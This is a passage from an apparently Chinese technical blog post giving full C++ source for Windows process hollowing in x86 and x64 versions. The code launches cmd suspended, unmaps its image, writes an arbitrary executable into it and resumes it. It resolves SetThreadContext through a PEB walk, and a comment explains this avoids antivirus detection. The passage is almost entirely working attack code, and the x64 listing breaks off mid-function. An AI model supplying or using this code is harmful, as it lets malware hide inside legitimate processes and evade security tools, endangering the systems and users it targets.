class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 傀儡进程/进程镂空</span></span><br><span class="line"><span class="comment">// 1. 以挂起的模式启动一个进程（计算器，cmd，notepad）合法程序</span></span><br><span class="line"><span class="comment">// 2. 把真正要执行的代码读入</span></span><br><span class="line"><span class="comment">// 3. 获取挂起进程相关信息</span></span><br><span class="line"><span class="comment">// 4. 把挂起进程的内存掏空</span></span><br><span class="line"><span class="comment">// 5. 把要执行的代码写入掏空的进程</span></span><br><span class="line"><span class="comment">// 6. 恢复执行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span>* szTARGETFILE = <span class="string">L&quot;D:\\test.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* FnNtUnmapViewOfSection)</span><span class="params">(HANDLE, PVOID)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI* MySetThreadContext)</span><span class="params">(_In_ HANDLE hThread,_In_ CONST CONTEXT* lpContext)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态获取SetThreadContext的地址</span></span><br><span class="line"><span class="function">DWORD <span class="title">DynamicCall</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取Kernel32的基址</span></span><br><span class="line">    DWORD dwKernel32 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// TEB结构体</span></span><br><span class="line">    _TEB* pTeb = <span class="built_in">NtCurrentTeb</span>();</span><br><span class="line">    <span class="comment">// PEB结构体</span></span><br><span class="line">    PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + <span class="number">0x30</span>);</span><br><span class="line">    <span class="comment">// LDR结构体</span></span><br><span class="line">    PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + <span class="number">0x0c</span>);</span><br><span class="line">    <span class="comment">// 进程所有模块</span></span><br><span class="line">    PDWORD pInLoadOrderLinks = (PDWORD) * (PDWORD)((DWORD)pLdr + <span class="number">0x0c</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主模块</span></span><br><span class="line">    PDWORD pModExe = (PDWORD)*pInLoadOrderLinks;</span><br><span class="line">    <span class="comment">// NtDll</span></span><br><span class="line">    PDWORD pModNtDll = (PDWORD)*pModExe;</span><br><span class="line">    <span class="comment">// Kernel32Dll</span></span><br><span class="line">    PDWORD pModKernel32 = (PDWORD)*pModNtDll;</span><br><span class="line">    <span class="comment">// 基址</span></span><br><span class="line">    dwKernel32 = pModKernel32[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel32 Base: %08x %S\n&quot;</span>, dwKernel32, (<span class="type">const</span> <span class="type">char</span>*)pModKernel32[<span class="number">12</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析PE文件</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dwKernel32;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD)pDos);</span><br><span class="line"></span><br><span class="line">    PDWORD pwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD)pDos);</span><br><span class="line">    PDWORD pwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD)pDos);</span><br><span class="line">    PWORD pAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD)pDos);</span><br><span class="line"></span><br><span class="line">    DWORD dwNumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DWORD dwGetProcAddress = 0;</span></span><br><span class="line">    DWORD dwSetThreadContext = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNumberOfNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* szFuncName = (<span class="type">char</span>*)(pwAddressOfNames[i] + (DWORD)pDos);</span><br><span class="line">        <span class="type">char</span> szSetThreadAddress[] = &#123; <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> nFlags = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (szFuncName[j] == szSetThreadAddress[j])</span><br><span class="line">            &#123;</span><br><span class="line">                nFlags++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nFlags == <span class="number">16</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dwSetThreadContext = (DWORD)(pwAddressOfFunctions[pAddressOfNameOrdinals[i]] + (DWORD)pDos);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不能打印SetThreadContext地址, 会触发HR报毒</span></span><br><span class="line">    <span class="comment">//printf(&quot;dwSetThreadContext: %08x\n&quot;, dwSetThreadContext);</span></span><br><span class="line">    <span class="keyword">if</span> (dwSetThreadContext == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dwSetThreadContext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFOA lpStartupInfo = &#123;&#125;;</span><br><span class="line">    lpStartupInfo.cb = <span class="built_in">sizeof</span>(STARTUPINFOA);</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;&#125;;</span><br><span class="line">    <span class="comment">// 以挂起的形式启动一个进程</span></span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;cmd&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;lpStartupInfo, &amp;pi))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFile</span>(szTARGETFILE, GENERIC_READ, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFile == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    LPVOID lpBuffer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    DWORD dwReadLenth = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">ReadFile</span>(hFile, lpBuffer, dwFileSize, &amp;dwReadLenth, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed,\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析PE</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取上下文</span></span><br><span class="line">    CONTEXT ctx = &#123;&#125;;</span><br><span class="line">    ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">    <span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">    LPVOID lpImageBase = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (LPVOID)(ctx.Ebx + <span class="number">8</span>), &amp;lpImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((DWORD)lpImageBase == pNt-&gt;OptionalHeader.ImageBase)</span><br><span class="line">    &#123;</span><br><span class="line">        FnNtUnmapViewOfSection NtUnmapViewOfSection = (FnNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibrary</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (NtUnmapViewOfSection == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;NtUnmapViewOfSection GetProcAddress Failed.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, lpImageBase);</span><br><span class="line">    &#125;</span><br><span class="line">    LPVOID lpTargetMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpTargetMemory == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteProcessMemory</span>(pi.hProcess, lpTargetMemory, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WritePrcessMemory PE Header Failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + (<span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER) * i));</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(pi.hProcess, ((LPBYTE)lpTargetMemory + pSec-&gt;VirtualAddress), ((LPBYTE)lpBuffer + pSec-&gt;PointerToRawData), pSec-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ctx.Eax = (DWORD)((LPBYTE)lpTargetMemory + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (LPVOID)(ctx.Ebx + <span class="built_in">sizeof</span>(DWORD) * <span class="number">2</span>), &amp;pNt-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(LPVOID), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//SetThreadContext(pi.hThread, &amp;ctx);</span></span><br><span class="line">    MySetThreadContext mySetThreadContext = (MySetThreadContext)<span class="built_in">DynamicCall</span>();</span><br><span class="line">    <span class="keyword">if</span> (mySetThreadContext == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DynamicCall Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mySetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">    <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x64位实现思路"><a href="#x64位实现思路" class="headerlink" title="x64位实现思路"></a>x64位实现思路</h2><blockquote><p>实现逻辑和x32位基本类似, 区别在于动态获取函数地址时需要从<code>gs:[0]</code>偏移<code>0x60</code>获取PEB<br>在64位系统中, TEB存储在<code>Rdx</code>寄存器中, 在PEB结构中<code>ImageBaseAddress</code>字段位于偏移量<code>0x10</code>, 因此<code>ctx.Rdx + (sizeof(SIZE_T) * 2)</code>等同于<code>(ctx.Rdx + 0x10)</code></p></blockquote><h2 id="x64位完整代码"><a href="#x64位完整代码" class="headerlink" title="x64位完整代码"></a>x64位完整代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 傀儡进程/进程镂空（x64）</span></span><br><span class="line"><span class="comment">// 1. 以挂起的模式启动一个进程（计算器、cmd、notepad）合法程序</span></span><br><span class="line"><span class="comment">// 2. 把真正要执行的代码读入</span></span><br><span class="line"><span class="comment">// 3. 获取挂起进程相关信息</span></span><br><span class="line"><span class="comment">// 4. 把挂起进程的内存掏空</span></span><br><span class="line"><span class="comment">// 5. 把要执行的代码写入掏空的进程</span></span><br><span class="line"><span class="comment">// 6. 恢复执行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要加载的程序</span></span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span>* TARGETFILE = <span class="string">L&quot;D:\\test.exe&quot;</span>;</span><br><span class="line"><span class="comment">// 定义函数类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* FnNtUnmapViewOfSection)</span><span class="params">(HANDLE, PVOID)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* MySetThreadContext)</span><span class="params">(_In_ HANDLE hThread, _In_ CONST CONTEXT* lpContext)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">DynamicCall</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 通过PEB获取kernel32基址</span></span><br><span class="line">    PVOID pPeb = <span class="built_in">reinterpret_cast</span>&lt;PVOID&gt;(__readgsqword(<span class="number">0x60</span>));</span><br><span class="line">    <span class="keyword">if</span> (!pPeb)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to get PEB address.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算 Ldr 地址的偏移量</span></span><br><span class="line">    ULONG64 ldrOffset = <span class="number">0x18</span>; <span class="comment">// PEB 结构中 Ldr 成员的偏移量</span></span><br><span class="line">    <span class="comment">// 获取_PEB_LDR_DATA</span></span><br><span class="line">    <span class="comment">//PVOID pLdr = *reinterpret_cast&lt;PVOID*&gt;(reinterpret_cast&lt;PBYTE&gt;(pPeb) + (ULONG64)0x18);</span></span><br><span class="line">    PVOID pLdr = *<span class="built_in">reinterpret_cast</span>&lt;PVOID*&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pPeb) + ldrOffset);</span><br><span class="line">    <span class="keyword">if</span> (!pLdr) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to get Ldr address.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算InMemoryOrderModuleList地址的偏移量</span></span><br><span class="line">    ULONG64 moduleListOffset = <span class="built_in">offsetof</span>(PEB_LDR_DATA, InMemoryOrderModuleList);</span><br><span class="line">    <span class="comment">// 计算InMemoryOrderModuleList地址</span></span><br><span class="line">    PLIST_ENTRY pModuleList = <span class="built_in">reinterpret_cast</span>&lt;PLIST_ENTRY&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pLdr) + moduleListOffset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取KERNEL32.dll基址</span></span><br><span class="line">    PLIST_ENTRY pKernel32Entry = pModuleList-&gt;Flink-&gt;Flink-&gt;Flink;</span><br><span class="line">    PLDR_DATA_TABLE_ENTRY pKernelEntry = <span class="built_in">CONTAINING_RECORD</span>(pKernel32Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">    PVOID pKernelBase = pKernelEntry-&gt;DllBase;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析PE</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pKernelBase;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)pDos);</span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD64)pDos);</span><br><span class="line"></span><br><span class="line">    PDWORD pwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD64)pDos);</span><br><span class="line">    PDWORD pwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD64)pDos);</span><br><span class="line">    PWORD dwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD64)pDos);</span><br><span class="line"></span><br><span class="line">    DWORD dwNumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">    DWORD64 dwSetThreadContext = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNumberOfNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* szFuncName = (<span class="type">char</span>*)(pwAddressOfNames[i] + (DWORD64)pDos);</span><br><span class="line">        <span class="type">char</span> szSetThreadAddress[] = &#123; <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">        <span class="type">int</span> iFlags = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (szFuncName[j] == szSetThreadAddress[j])</span><br><span class="line">            &#123;</span><br><span class="line">                iFlags++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (iFlags == <span class="number">16</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dwSetThreadContext = (DWORD64)(pwAddressOfFunctions[dwAddressOfNameOrdinals[i]] + (DWORD64)pDos);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dwSetThreadContext == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwSetThreadContext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFOA si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(STARTUPINFOA);</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;cmd&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateProcessA Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> 